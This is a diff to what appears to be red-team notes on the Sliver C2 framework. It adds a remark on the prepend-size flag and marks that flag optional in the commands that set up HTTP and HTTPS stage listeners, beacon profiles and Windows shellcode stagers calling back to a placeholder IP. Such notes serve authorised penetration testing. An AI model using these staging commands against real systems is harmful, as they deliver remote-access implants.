@@ -431,12 +431,14 @@ sliver > generate stager -r tcp -L <IP> -l 8080 -a x64 -o windows -f raw -s stag
 
 #### 4.3.2.3 - HTTP
 
+Note: `-P` or `--prepend-size` treats the first four bytes as instructions that your shellcode loader may not took this into account. It uses `msfvenom` to generate shellcode for you if it's installed on your system.
+
 ```
 sliver > https -L <IP> -l 4488
 
 sliver > profiles new beacon -b https://<IP>:4488 -S 5 -J 10 -l -a x64 -o windows -f shellcode stager-shellcode
 
-sliver > stage-listener -u http://<IP>:8080 -P -p stager-shellcode
+sliver > stage-listener -u http://<IP>:8080 [-P] -p stager-shellcode
 
 sliver > generate stager -r http -L <IP> -l 8080 -a x64 -o windows -f raw -s sliver-http-stager.bin
 ```
@@ -468,7 +470,7 @@ sliver > mtls -L <IP> -l 4488
 
 sliver > profiles new -m <IP>:4488 -l -a x64 -o windows -f shellcode stager-shellcode
 
-sliver > stage-listener -u https://<IP>:8080 -C <zlib | gzip | deflate9> -c /path/to/certificate.pem -k /path/to/key.pem -P -p stager-shellcode
+sliver > stage-listener -u https://<IP>:8080 -C <zlib | gzip | deflate9> -c /path/to/certificate.pem -k /path/to/key.pem [-P] -p stager-shellcode
 
 sliver > generate stager -r https -L <IP> -l 8080 -a x64 -o windows -f raw -s sliver-https-stager.bin
 ```
